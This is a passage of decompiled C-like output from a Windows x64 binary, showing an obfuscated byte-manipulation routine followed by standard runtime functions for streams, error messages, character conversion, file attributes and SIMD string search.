          cVar2 = bVar13 + (bVar7 + 0x32 & bVar13) * -2 + -0x2c;
LAB_14004fb60:
          local_118 = cVar2 + bVar7;
LAB_14004fb63:
          if (uVar4 == 0) {
            if (uVar10 == 0xffffffffffffffff) {
              local_118 = (bVar7 + bVar13 + (bVar7 + 0x88 & bVar13) * -2) - 0x30;
              uVar12 = uVar12 + abStack_e9[uVar12 + 1];
              goto LAB_14004f702;
            }
            if (uVar10 == 0xfffffffffffffffe) {
              bVar6 = bVar7 - 0x10 & bVar13;
              cVar2 = '0';
              uVar4 = 0;
LAB_140050080:
              cVar2 = (cVar2 - bVar6) * '\x02' + bVar13;
              goto LAB_140050089;
            }
            if (uVar10 == 0xfffffffffffffffd) {
              local_118 = ('\x14' - (bVar7 + 0x24 & bVar13)) * '\x02' + bVar13 + bVar7;
              goto LAB_140050057;
            }
            if (uVar10 != 0xfffffffffffffffb) {
              if (uVar10 == 0xfffffffffffffffc) {
                local_118 = bVar7 + bVar13 + (bVar7 - 0x40 & bVar13) * -2 + 0x80;
                goto LAB_14004f702;
              }
              if (uVar10 == 0xfffffffffffffff9) {
                local_118 = ('\b' - (bVar7 + 0x28 & bVar13)) * '\x02' + bVar13 + bVar7;
                goto LAB_14005001c;
              }
LAB_14004fb27:
              if (uVar10 == 0) {
LAB_14004fb03:
                abStack_e9[uVar12 + 1] = local_118;
                uVar12 = uVar12 + 1;
                goto LAB_14004f702;
              }
              local_118 = (bVar13 + (bVar7 + 0x5c & bVar13) * -2 + bVar7) * '\x02' + 0xb0;
              goto LAB_14005001c;
            }
            local_118 = bVar13 + (bVar7 + 0x8c & bVar13) * -2 + -0x48 + bVar7;
          }
          else {
            local_118 = bVar13 * '\x02' + (bVar7 + 0x90 & bVar13) * -2 + -0x60 + bVar7;
          }
LAB_14004ff5b:
          abStack_e9[uVar12 + 1] =
               ('-' - (bVar7 + 0xaa & bVar13)) * '\x02' + bVar7 + 0xaa + local_118 + bVar13;
          uVar4 = uVar4 + uVar10;
        }
        else {
          if (uVar4 == uVar10 + 1) {
            local_118 = bVar13 + (bVar7 + 0x66 & bVar13) * -2 + -100 + bVar7;
LAB_14005001c:
            abStack_e9[uVar12 + 1] = bVar7 + 0x76 + (bVar7 + 0x76 & bVar13) * -2 + -0x3a + bVar13;
            uVar10 = uVar10 + 1;
            goto LAB_14004f702;
          }
          if (uVar4 == uVar10 + 3) {
            local_118 = ('\x16' - (bVar7 - 0x32 & bVar13)) * '\x02' + bVar13 + bVar7;
            goto LAB_14004f702;
          }
          if (uVar4 == uVar10 + 4) {
            local_118 = bVar7 + bVar13 + (bVar7 + 0x36 & bVar13) * -2 + 0xbc;
            uVar4 = uVar4 + uVar10;
          }
          else {
            if (uVar4 != uVar10 + 5) {
              if (uVar4 != uVar10 + 6) goto LAB_14004fb63;
              bVar6 = bVar7 + 0x9e & bVar13;
              cVar2 = '&';
              goto LAB_140050080;
            }
            local_118 = bVar7 + bVar13 + (bVar7 + 0x6a & bVar13) * -2 + 0x84;
          }
        }
      }
      else {
        if (uVar4 == uVar10 + 1) {
          local_118 = ('4' - (bVar7 + 0x44 & bVar13)) * '\x02' + bVar13 + bVar7;
          uVar12 = uVar12 + abStack_e9[uVar12 + 1] + uVar10 + 1;
          goto LAB_14004f702;
        }
        if (uVar4 == uVar10 + 3) {
          local_118 = (bVar7 + bVar13 + (bVar7 - 0x20 & bVar13) * -2) - 0x40;
        }
        else {
          if (uVar4 != uVar10 + 5) {
            if (uVar4 != uVar10 + 7) {
              if (uVar4 != uVar10 + 9) goto LAB_14004fbb9;
              local_118 = bVar13 + (bVar7 - 0x1c & bVar13) * -2 + -0x58 + bVar7;
              goto LAB_14005001c;
            }
            local_118 = ('\f' - (bVar7 + 0x7c & bVar13)) * '\x02' + bVar13 + bVar7;
            goto LAB_14004f702;
          }
          local_118 = bVar7 + bVar13 + (bVar7 + 0x14 & bVar13) * -2 + 0x88;
          uVar4 = uVar4 + uVar10;
        }
      }
LAB_140050057:
      uVar12 = uVar12 - local_118;
      goto LAB_14004f702;
    }
  }
LAB_140050c89:
  FUN_140025000(local_60);
  FUN_140025000(local_40);
  return in_stack_007841bd;
}



/* ==================================================================== */
/* FUN_140050cc0 @ 140050cc0 */

void FUN_140050cc0(longlong param_1)

{
  int iVar1;

  *(undefined ***)((longlong)*(int *)(*(longlong *)(param_1 + -0xb0) + 4) + -0xb0 + param_1) =
       &PTR_LAB_140057348;
  iVar1 = *(int *)(*(longlong *)(param_1 + -0xb0) + 4);
  *(int *)((longlong)iVar1 + -0xb4 + param_1) = iVar1 + -0xb0;
  FUN_1400243b0(param_1 + -0xa0);
                    /* WARNING: Could not recover jumptable at 0x000140050d15. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_istream<char,std::char_traits<char>_>::~basic_istream<char,std::char_traits<char>_>
            ((basic_istream<char,std::char_traits<char>_> *)(param_1 + -0x98));
  return;
}



/* ==================================================================== */
/* FUN_140050d20 @ 140050d20 */

basic_istream<char,std::char_traits<char>_> *
FUN_140050d20(basic_istream<char,std::char_traits<char>_> *param_1,undefined8 *param_2)

{
  longlong lVar1;

  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  *(undefined **)param_1 = &DAT_140057334;
  std::basic_ios<char,std::char_traits<char>_>::basic_ios<char,std::char_traits<char>_>
            ((basic_ios<char,std::char_traits<char>_> *)(param_1 + 0xb0));
  std::basic_istream<char,std::char_traits<char>_>::basic_istream<char,std::char_traits<char>_>
            (param_1,(basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 0x10),false);
  *(undefined ***)(param_1 + *(int *)(*(longlong *)param_1 + 4)) = &PTR_LAB_140057348;
  *(int *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + -4) =
       *(int *)(*(longlong *)param_1 + 4) + -0xb0;
  std::basic_streambuf<char,std::char_traits<char>_>::basic_streambuf<char,std::char_traits<char>_>
            ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 0x10));
  *(undefined ***)(param_1 + 0x10) = &PTR_FUN_140057120;
  param_1[0x8c] = (basic_istream<char,std::char_traits<char>_>)0x0;
  param_1[0x81] = (basic_istream<char,std::char_traits<char>_>)0x0;
  std::basic_streambuf<char,std::char_traits<char>_>::_Init
            ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 0x10));
  *(undefined8 *)(param_1 + 0x90) = 0;
  *(undefined8 *)(param_1 + 0x84) = DAT_140a61890;
  *(undefined8 *)(param_1 + 0x78) = 0;
  lVar1 = FUN_140025bf0(param_1 + 0x10,param_2);
  if (lVar1 == 0) {
    std::basic_ios<char,std::char_traits<char>_>::setstate
              ((basic_ios<char,std::char_traits<char>_> *)
               (param_1 + *(int *)(*(longlong *)param_1 + 4)),2,false);
  }
  *(undefined ***)(param_1 + *(int *)(*(longlong *)param_1 + 4)) = &PTR_LAB_140057348;
  *(int *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + -4) =
       *(int *)(*(longlong *)param_1 + 4) + -0xb0;
  return param_1;
}



/* ==================================================================== */
/* FUN_140050e60 @ 140050e60 */

void * FUN_140050e60(longlong param_1,ulonglong param_2)

{
  void *_Memory;

  _Memory = (void *)(param_1 + -0xb0);
  FUN_14004e410(_Memory);
  if ((param_2 & 1) != 0) {
    free(_Memory);
  }
  return _Memory;
}



/* ==================================================================== */
/* FUN_140050ea0 @ 140050ea0 */

void FUN_140050ea0(undefined8 *param_1)

{
  void *_Dst;

  _Dst = (void *)FUN_14000e6b0(0x4000);
  *param_1 = _Dst;
  param_1[2] = (longlong)_Dst + 0x4000;
  memset(_Dst,0,0x4000);
  param_1[1] = (longlong)_Dst + 0x4000;
  return;
}



/* ==================================================================== */
/* MSVCP140.DLL::std::_Xbad_alloc @ 140050efc */

void __cdecl std::_Xbad_alloc(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140050efc. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  _Xbad_alloc();
  return;
}



/* ==================================================================== */
/* FUN_140050f04 @ 140050f04 */

ulonglong FUN_140050f04(DWORD param_1,longlong *param_2)

{
  int iVar1;
  DWORD DVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  int iVar5;
  byte *pbVar6;
  DWORD local_res18 [2];

  DVar2 = 0;
  local_res18[0] = 0;
  iVar5 = 0;
  do {
    if (DVar2 != 0) break;
    if (iVar5 == 0) {
      local_res18[0] = 0x409;
LAB_140050f6b:
      DVar2 = FormatMessageA(0x1300,(LPCVOID)0x0,param_1,local_res18[0],(LPSTR)param_2,0,
                             (va_list *)0x0);
    }
    else {
      if (iVar5 != 1) {
        local_res18[0] = 0;
        goto LAB_140050f6b;
      }
      iVar1 = GetLocaleInfoEx(L"!x-sys-default-locale",0x20000001,(LPWSTR)local_res18,2);
      if (iVar1 != 0) goto LAB_140050f6b;
    }
    iVar5 = iVar5 + 1;
  } while (iVar5 < 3);
  uVar3 = (ulonglong)DVar2;
  if (DVar2 != 0) {
    pbVar6 = (byte *)(*param_2 + -1 + uVar3);
    uVar4 = uVar3;
    do {
      if ((&DAT_1400547e0)[*pbVar6] == '\0') {
        return uVar4;
      }
      pbVar6 = pbVar6 + -1;
      uVar4 = uVar4 - 1;
      uVar3 = 0;
    } while (uVar4 != 0);
  }
  return uVar3;
}



/* ==================================================================== */
/* KERNEL32.DLL::LocalFree @ 140050fdc */

HLOCAL __stdcall LocalFree(HLOCAL hMem)

{
  HLOCAL pvVar1;

                    /* WARNING: Could not recover jumptable at 0x000140050fdc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = LocalFree(hMem);
  return pvVar1;
}



/* ==================================================================== */
/* FUN_140050fe4 @ 140050fe4 */

ulonglong FUN_140050fe4(void)

{
  UINT UVar1;
  BOOL BVar2;
  ulonglong uVar3;

  UVar1 = ___lc_codepage_func();
  uVar3 = 0xfde9;
  if (UVar1 != 0xfde9) {
    BVar2 = AreFileApisANSI();
    uVar3 = (ulonglong)(BVar2 == 0);
  }
  return uVar3;
}



/* ==================================================================== */
/* FUN_14005100c @ 14005100c */

undefined8 FUN_14005100c(UINT param_1,LPCSTR param_2,int param_3,LPWSTR param_4,int param_5)

{
  int iVar1;
  DWORD DStack_14;

  iVar1 = MultiByteToWideChar(param_1,8,param_2,param_3,param_4,param_5);
  if (iVar1 == 0) {
    DStack_14 = GetLastError();
  }
  else {
    DStack_14 = 0;
  }
  return CONCAT44(DStack_14,iVar1);
}



/* ==================================================================== */
/* FUN_140051054 @ 140051054 */

undefined8 FUN_140051054(UINT param_1,LPCWSTR param_2,int param_3,LPSTR param_4,int param_5)

{
  int local_18;
  DWORD DStack_14;

  local_18 = WideCharToMultiByte(param_1,0x400,param_2,param_3,param_4,param_5,(LPCSTR)0x0,
                                 (LPBOOL)0x0);
  if (local_18 == 0) {
    DStack_14 = GetLastError();
  }
  else {
    DStack_14 = 0;
  }
  if (DStack_14 == 0x3ec) {
    local_18 = WideCharToMultiByte(param_1,0,param_2,param_3,param_4,param_5,(LPCSTR)0x0,(LPBOOL)0x0
                                  );
    if (local_18 == 0) {
      DStack_14 = GetLastError();
    }
    else {
      DStack_14 = 0;
    }
  }
  return CONCAT44(DStack_14,local_18);
}



/* ==================================================================== */
/* FUN_140051130 @ 140051130 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

DWORD FUN_140051130(LPCWSTR param_1,ulonglong *param_2,uint param_3,uint param_4)

{
  BOOL BVar1;
  DWORD DVar2;
  HANDLE pvVar3;
  uint uVar4;
  uint uVar5;
  undefined1 auStack_2d8 [32];
  undefined4 local_2b8;
  undefined4 uStack_2b4;
  uint local_2b0 [2];
  ulonglong local_2a8;
  undefined4 local_2a0;
  uint local_29c;
  DWORD DStack_298;
  DWORD local_294;
  uint local_290;
  _WIN32_FIND_DATAW local_288;
  ulonglong local_38;

  local_38 = DAT_14005d040 ^ (ulonglong)auStack_2d8;
  uVar4 = param_3 & 0xfffffffe;
  if (((param_3 & 1) != 0) && ((param_3 & 4) != 0)) {
    return 0x57;
  }
  if ((((param_3 & 2) != 0) && (param_4 != 0xffffffff)) &&
     (((param_4 & 0x400) == 0 || ((param_3 & 1) == 0)))) {
    uVar4 = param_3 & 0xfffffffc;
    *(uint *)(param_2 + 2) = param_4;
  }
  if (uVar4 == 0) {
    return 0;
  }
  if (((uVar4 & 0x2a) != 0) &&
     (((param_4 == 0xffffffff || ((param_4 & 0x400) == 0)) || ((param_3 & 1) == 0)))) {
    BVar1 = GetFileAttributesExW(param_1,GetFileExInfoStandard,local_2b0);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 != 0x20) {
        return DVar2;
      }
      pvVar3 = FindFirstFileW(param_1,&local_288);
      if (pvVar3 == (HANDLE)0xffffffffffffffff) {
        DVar2 = GetLastError();
        return DVar2;
      }
      FindClose(pvVar3);
      local_29c = local_288.ftLastWriteTime.dwLowDateTime;
      DStack_298 = local_288.ftLastWriteTime.dwHighDateTime;
    }
    else {
      local_288.ftLastWriteTime.dwHighDateTime = DStack_298;
      local_288.ftLastWriteTime.dwLowDateTime = local_29c;
      local_288.dwFileAttributes = local_2b0[0];
      local_288.nFileSizeLow = local_290;
      local_288.nFileSizeHigh = local_294;
    }
    if (((param_3 & 1) == 0) || ((local_288.dwFileAttributes & 0x400) == 0)) {
      *(DWORD *)(param_2 + 2) = local_288.dwFileAttributes;
      param_2[1] = CONCAT44(local_288.nFileSizeHigh,local_288.nFileSizeLow);
      *param_2 = (ulonglong)local_288.ftLastWriteTime & 0xffffffff00000000 | (ulonglong)local_29c;
      uVar5 = uVar4 & 0xffffffd5;
      if (((local_288.dwFileAttributes & 0x400) == 0) && ((uVar4 & 4) != 0)) {
        *(undefined4 *)((longlong)param_2 + 0x14) = 0;
        uVar5 = uVar4 & 0xffffffd1;
      }
      uVar4 = uVar5;
      if (uVar4 == 0) {
        return 0;
      }
    }
  }
  DVar2 = __std_fs_open_handle(&local_2b8,param_1,0x80,(((byte)param_3 & 1 ^ 1) + 0x10) * 0x200000);
  if (DVar2 == 0) {
    pvVar3 = (HANDLE)CONCAT44(uStack_2b4,local_2b8);
    uVar5 = uVar4;
    if ((uVar4 & 0x26) != 0) {
      BVar1 = GetFileInformationByHandleEx(pvVar3,FileBasicInfo,local_2b0,0x28);
      if (BVar1 == 0) {
        DVar2 = GetLastError();
        if (pvVar3 == (HANDLE)0xffffffffffffffff) {
          return DVar2;
        }
        BVar1 = CloseHandle(pvVar3);
        if (BVar1 == 0) {
                    /* WARNING: Subroutine does not return */
          abort();
        }
        return DVar2;
      }
      uVar5 = uVar4 & 0xffffffdd;
      *(uint *)(param_2 + 2) = local_290;
      *param_2 = CONCAT44(local_29c,local_2a0);
      if ((uVar4 & 4) != 0) {
        if ((local_290 & 0x400) == 0) {
          *(undefined4 *)((longlong)param_2 + 0x14) = 0;
        }
        else {
          BVar1 = GetFileInformationByHandleEx(pvVar3,FileAttributeTagInfo,&local_2b8,8);
          if (BVar1 == 0) {
            DVar2 = GetLastError();
            if (pvVar3 == (HANDLE)0xffffffffffffffff) {
              return DVar2;
            }
            BVar1 = CloseHandle(pvVar3);
            if (BVar1 == 0) {
                    /* WARNING: Subroutine does not return */
              abort();
            }
            return DVar2;
          }
          *(undefined4 *)((longlong)param_2 + 0x14) = uStack_2b4;
        }
        uVar5 = uVar4 & 0xffffffd9;
      }
    }
    if ((uVar5 & 0x18) != 0) {
      BVar1 = GetFileInformationByHandleEx(pvVar3,FileStandardInfo,local_2b0,0x18);
      if (BVar1 == 0) {
        DVar2 = GetLastError();
        if ((pvVar3 != (HANDLE)0xffffffffffffffff) && (BVar1 = CloseHandle(pvVar3), BVar1 == 0)) {
                    /* WARNING: Subroutine does not return */
          abort();
        }
        return DVar2;
      }
      uVar5 = uVar5 & 0xffffffe7;
      param_2[1] = local_2a8;
      *(undefined4 *)(param_2 + 3) = local_2a0;
    }
    if (uVar5 == 0) {
      if (pvVar3 == (HANDLE)0xffffffffffffffff) {
        return 0;
      }
      BVar1 = CloseHandle(pvVar3);
      if (BVar1 != 0) {
        return 0;
      }
    }
    else if ((pvVar3 == (HANDLE)0xffffffffffffffff) || (BVar1 = CloseHandle(pvVar3), BVar1 != 0)) {
      return 0x32;
    }
  }
  else if (((HANDLE)CONCAT44(uStack_2b4,local_2b8) == (HANDLE)0xffffffffffffffff) ||
          (BVar1 = CloseHandle((HANDLE)CONCAT44(uStack_2b4,local_2b8)), BVar1 != 0)) {
    return DVar2;
  }
                    /* WARNING: Subroutine does not return */
  abort();
}



/* ==================================================================== */
/* __std_fs_open_handle @ 140051458 */

/* Library Function - Single Match
    __std_fs_open_handle

   Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release */

DWORD __std_fs_open_handle(undefined8 *param_1,LPCWSTR param_2,DWORD param_3,DWORD param_4)

{
  DWORD DVar1;
  HANDLE pvVar2;

  DVar1 = 0;
  pvVar2 = CreateFileW(param_2,param_3,7,(LPSECURITY_ATTRIBUTES)0x0,3,param_4,(HANDLE)0x0);
  *param_1 = pvVar2;
  if (pvVar2 == (HANDLE)0xffffffffffffffff) {
    DVar1 = GetLastError();
  }
  return DVar1;
}



/* ==================================================================== */
/* FUN_1400514b8 @ 1400514b8 */

void FUN_1400514b8(undefined8 param_1)

{
  undefined8 *puVar1;

  puVar1 = malloc(0x10);
  if (puVar1 == (undefined8 *)0x0) {
                    /* WARNING: Subroutine does not return */
    std::_Xbad_alloc();
  }
  *puVar1 = DAT_140a61280;
  puVar1[1] = param_1;
  DAT_140a61280 = puVar1;
  return;
}



/* ==================================================================== */
/* FUN_140051530 @ 140051530 */

undefined1 (*) [32]
FUN_140051530(undefined1 (*param_1) [32],undefined1 (*param_2) [32],byte param_3)

{
  ushort uVar1;
  undefined1 auVar2 [32];
  undefined1 *puVar3;
  uint uVar4;
  uint uVar5;
  ulonglong uVar6;
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [32];

  uVar6 = (longlong)param_2 - (longlong)param_1;
  if (((uVar6 & 0xffffffffffffffe0) == 0) || ((DAT_14005d094 & 0x20) == 0)) {
    if (((uVar6 & 0xfffffffffffffff0) != 0) && ((DAT_14005d094 & 4) != 0)) {
      puVar3 = *param_1;
      auVar8 = pshufb(ZEXT116(param_3),ZEXT816(0));
      do {
        auVar7[0] = -((*param_1)[0] == auVar8[0]);
        auVar7[1] = -((*param_1)[1] == auVar8[1]);
        auVar7[2] = -((*param_1)[2] == auVar8[2]);
        auVar7[3] = -((*param_1)[3] == auVar8[3]);
        auVar7[4] = -((*param_1)[4] == auVar8[4]);
        auVar7[5] = -((*param_1)[5] == auVar8[5]);
        auVar7[6] = -((*param_1)[6] == auVar8[6]);
        auVar7[7] = -((*param_1)[7] == auVar8[7]);
        auVar7[8] = -((*param_1)[8] == auVar8[8]);
        auVar7[9] = -((*param_1)[9] == auVar8[9]);
        auVar7[10] = -((*param_1)[10] == auVar8[10]);
        auVar7[0xb] = -((*param_1)[0xb] == auVar8[0xb]);
        auVar7[0xc] = -((*param_1)[0xc] == auVar8[0xc]);
        auVar7[0xd] = -((*param_1)[0xd] == auVar8[0xd]);
        auVar7[0xe] = -((*param_1)[0xe] == auVar8[0xe]);
        auVar7[0xf] = -((*param_1)[0xf] == auVar8[0xf]);
        uVar1 = (ushort)(SUB161(auVar7 >> 7,0) & 1) | (ushort)(SUB161(auVar7 >> 0xf,0) & 1) << 1 |
                (ushort)(SUB161(auVar7 >> 0x17,0) & 1) << 2 |
                (ushort)(SUB161(auVar7 >> 0x1f,0) & 1) << 3 |
                (ushort)(SUB161(auVar7 >> 0x27,0) & 1) << 4 |
                (ushort)(SUB161(auVar7 >> 0x2f,0) & 1) << 5 |
                (ushort)(SUB161(auVar7 >> 0x37,0) & 1) << 6 |
                (ushort)(SUB161(auVar7 >> 0x3f,0) & 1) << 7 |
                (ushort)(SUB161(auVar7 >> 0x47,0) & 1) << 8 |
                (ushort)(SUB161(auVar7 >> 0x4f,0) & 1) << 9 |
                (ushort)(SUB161(auVar7 >> 0x57,0) & 1) << 10 |
                (ushort)(SUB161(auVar7 >> 0x5f,0) & 1) << 0xb |
                (ushort)(SUB161(auVar7 >> 0x67,0) & 1) << 0xc |
                (ushort)(SUB161(auVar7 >> 0x6f,0) & 1) << 0xd |
                (ushort)(SUB161(auVar7 >> 0x77,0) & 1) << 0xe | (ushort)(auVar7[0xf] >> 7) << 0xf;
        if (uVar1 != 0) {
          uVar4 = 0;
          if (uVar1 != 0) {
            for (; (uVar1 >> uVar4 & 1) == 0; uVar4 = uVar4 + 1) {
            }
          }
          return (undefined1 (*) [32])(*param_1 + uVar4);
        }
        param_1 = (undefined1 (*) [32])(*param_1 + 0x10);
      } while (param_1 != (undefined1 (*) [32])(puVar3 + (uVar6 & 0xfffffffffffffff0)));
    }
  }
  else {
    puVar3 = *param_1;
    auVar8 = vpshufb_avx(ZEXT416((uint)(int)(char)param_3),(undefined1  [16])0x0);
    auVar9._16_16_ = auVar8;
    auVar9._0_16_ = auVar8;
    do {
      auVar2 = vpcmpeqb_avx2(auVar9,*param_1);
      uVar4 = (uint)(SUB321(auVar2 >> 7,0) & 1) | (uint)(SUB321(auVar2 >> 0xf,0) & 1) << 1 |
              (uint)(SUB321(auVar2 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar2 >> 0x1f,0) & 1) << 3
              | (uint)(SUB321(auVar2 >> 0x27,0) & 1) << 4 |
              (uint)(SUB321(auVar2 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar2 >> 0x37,0) & 1) << 6
              | (uint)(SUB321(auVar2 >> 0x3f,0) & 1) << 7 |
              (uint)(SUB321(auVar2 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar2 >> 0x4f,0) & 1) << 9
              | (uint)(SUB321(auVar2 >> 0x57,0) & 1) << 10 |
              (uint)(SUB321(auVar2 >> 0x5f,0) & 1) << 0xb |
              (uint)(SUB321(auVar2 >> 0x67,0) & 1) << 0xc |
              (uint)(SUB321(auVar2 >> 0x6f,0) & 1) << 0xd |
              (uint)(SUB321(auVar2 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar2 >> 0x7f,0) << 0xf |
              (uint)(SUB321(auVar2 >> 0x87,0) & 1) << 0x10 |
              (uint)(SUB321(auVar2 >> 0x8f,0) & 1) << 0x11 |
              (uint)(SUB321(auVar2 >> 0x97,0) & 1) << 0x12 |
              (uint)(SUB321(auVar2 >> 0x9f,0) & 1) << 0x13 |
              (uint)(SUB321(auVar2 >> 0xa7,0) & 1) << 0x14 |
              (uint)(SUB321(auVar2 >> 0xaf,0) & 1) << 0x15 |
              (uint)(SUB321(auVar2 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar2 >> 0xbf,0) << 0x17
              | (uint)(SUB321(auVar2 >> 199,0) & 1) << 0x18 |
              (uint)(SUB321(auVar2 >> 0xcf,0) & 1) << 0x19 |
              (uint)(SUB321(auVar2 >> 0xd7,0) & 1) << 0x1a |
              (uint)(SUB321(auVar2 >> 0xdf,0) & 1) << 0x1b |
              (uint)(SUB321(auVar2 >> 0xe7,0) & 1) << 0x1c |
              (uint)(SUB321(auVar2 >> 0xef,0) & 1) << 0x1d |
              (uint)(SUB321(auVar2 >> 0xf7,0) & 1) << 0x1e | (uint)(byte)(auVar2[0x1f] >> 7) << 0x1f
      ;
      if (uVar4 != 0) goto LAB_1400515d1;
      param_1 = param_1 + 1;
    } while (param_1 != (undefined1 (*) [32])(puVar3 + (uVar6 & 0xffffffffffffffe0)));
    uVar5 = (uint)uVar6 & 0x1c;
    if ((uVar6 & 0x1c) != 0) {
      auVar2 = vpmaskmovd_avx2(*(undefined1 (*) [32])(&DAT_140056e20 + -(ulonglong)uVar5),*param_1);
      auVar9 = vpcmpeqb_avx2(auVar2,auVar9);
      auVar9 = vpand_avx2(auVar9,*(undefined1 (*) [32])(&DAT_140056e20 + -(ulonglong)uVar5));
      uVar4 = (uint)(SUB321(auVar9 >> 7,0) & 1) | (uint)(SUB321(auVar9 >> 0xf,0) & 1) << 1 |
              (uint)(SUB321(auVar9 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar9 >> 0x1f,0) & 1) << 3
              | (uint)(SUB321(auVar9 >> 0x27,0) & 1) << 4 |
              (uint)(SUB321(auVar9 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar9 >> 0x37,0) & 1) << 6
              | (uint)(SUB321(auVar9 >> 0x3f,0) & 1) << 7 |
              (uint)(SUB321(auVar9 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar9 >> 0x4f,0) & 1) << 9
              | (uint)(SUB321(auVar9 >> 0x57,0) & 1) << 10 |
              (uint)(SUB321(auVar9 >> 0x5f,0) & 1) << 0xb |
              (uint)(SUB321(auVar9 >> 0x67,0) & 1) << 0xc |
              (uint)(SUB321(auVar9 >> 0x6f,0) & 1) << 0xd |
              (uint)(SUB321(auVar9 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar9 >> 0x7f,0) << 0xf |
              (uint)(SUB321(auVar9 >> 0x87,0) & 1) << 0x10 |
              (uint)(SUB321(auVar9 >> 0x8f,0) & 1) << 0x11 |
              (uint)(SUB321(auVar9 >> 0x97,0) & 1) << 0x12 |
              (uint)(SUB321(auVar9 >> 0x9f,0) & 1) << 0x13 |
              (uint)(SUB321(auVar9 >> 0xa7,0) & 1) << 0x14 |
              (uint)(SUB321(auVar9 >> 0xaf,0) & 1) << 0x15 |
              (uint)(SUB321(auVar9 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar9 >> 0xbf,0) << 0x17
              | (uint)(SUB321(auVar9 >> 199,0) & 1) << 0x18 |
              (uint)(SUB321(auVar9 >> 0xcf,0) & 1) << 0x19 |
              (uint)(SUB321(auVar9 >> 0xd7,0) & 1) << 0x1a |
              (uint)(SUB321(auVar9 >> 0xdf,0) & 1) << 0x1b |
              (uint)(SUB321(auVar9 >> 0xe7,0) & 1) << 0x1c |
              (uint)(SUB321(auVar9 >> 0xef,0) & 1) << 0x1d |
              (uint)(SUB321(auVar9 >> 0xf7,0) & 1) << 0x1e | (uint)(byte)(auVar9[0x1f] >> 7) << 0x1f
      ;
      if (uVar4 != 0) {
LAB_1400515d1:
        uVar5 = 0;
        for (; (uVar4 & 1) == 0; uVar4 = uVar4 >> 1 | 0x80000000) {
          uVar5 = uVar5 + 1;
        }
        return (undefined1 (*) [32])(*param_1 + uVar5);
      }
      param_1 = (undefined1 (*) [32])(*param_1 + uVar5);
    }
  }
  for (; (param_1 != param_2 && ((*param_1)[0] != param_3));
      param_1 = (undefined1 (*) [32])(*param_1 + 1)) {
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140051630 @ 140051630 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined1 (*) [16]
FUN_140051630(undefined1 (*param_1) [16],undefined1 (*param_2) [16],undefined1 (*param_3) [16],
             ulonglong param_4)

{
  undefined1 auVar1 [16];
  undefined1 (*pauVar2) [16];
  int iVar3;
  ulonglong uVar4;
  char *pcVar5;
  size_t _Size;
  uint uVar6;
  longlong lVar7;
  undefined1 uVar8;
  bool bVar9;
  undefined1 auVar10 [16];
  undefined1 auStack_78 [32];
  undefined1 local_58 [16];
  ulonglong local_48;

  local_48 = DAT_14005d040 ^ (ulonglong)auStack_78;
  if (param_4 == 0) {
    return param_1;
  }
  if (param_4 == 1) {
    pauVar2 = (undefined1 (*) [16])FUN_140051530(param_1,param_2,(*param_3)[0]);
    return pauVar2;
  }
  uVar4 = (longlong)param_2 - (longlong)param_1;
  if (param_4 <= uVar4) {
    if ((((byte)DAT_14005d094 & 4) == 0) || (uVar4 < 0x10)) {
      pauVar2 = (undefined1 (*) [16])((longlong)param_1 + uVar4 + (1 - param_4));
      if (param_1 != pauVar2) {
        lVar7 = (longlong)param_3 - (longlong)param_1;
        do {
          if ((*param_1)[0] == (*param_3)[0]) {
            pcVar5 = *param_1 + 1;
            while (*pcVar5 == pcVar5[lVar7]) {
              pcVar5 = pcVar5 + 1;
              if ((longlong)pcVar5 - (longlong)param_1 == param_4) {
                return param_1;
              }
            }
          }
          param_1 = (undefined1 (*) [16])(*param_1 + 1);
          lVar7 = lVar7 + -1;
        } while (param_1 != pauVar2);
      }
    }
    else if (param_4 < 0x11) {
      uVar6 = (uint)param_4;
      uVar8 = 0x10 < uVar6;
      memcpy(local_58,param_3,param_4);
      auVar1 = local_58;
      do {
        iVar3 = pcmpestri(local_58,*param_1,0xc,uVar6,0x10);
        if ((bool)uVar8) {
          param_1 = (undefined1 (*) [16])(*param_1 + iVar3);
          if (iVar3 <= (int)(0x10 - uVar6)) {
            return param_1;
          }
        }
        else {
          param_1 = param_1 + 1;
        }
        uVar8 = param_1 < param_2 + -1;
      } while (param_1 <= param_2 + -1);
      bVar9 = param_2 < param_1;
      _Size = (longlong)param_2 - (longlong)param_1;
      if (_Size != 0) {
        memcpy(local_58,param_1,_Size);
        iVar3 = pcmpestri(auVar1,local_58,0xc,uVar6,(int)_Size);
        if (bVar9) {
          return (undefined1 (*) [16])(*param_1 + iVar3);
        }
      }
    }
    else {
      auVar1 = *param_3;
      bVar9 = CARRY8((longlong)param_1 - param_4,uVar4);
      pauVar2 = (undefined1 (*) [16])(((longlong)param_1 - param_4) + uVar4);
      do {
        iVar3 = pcmpestri(auVar1,*param_1,0xc,0x10,0x10);
        if (bVar9) {
          if (iVar3 == 0) {
LAB_140051785:
            iVar3 = memcmp(param_1 + 1,param_3 + 1,param_4 - 0x10);
            if (iVar3 == 0) {
              return param_1;
            }
          }
          else {
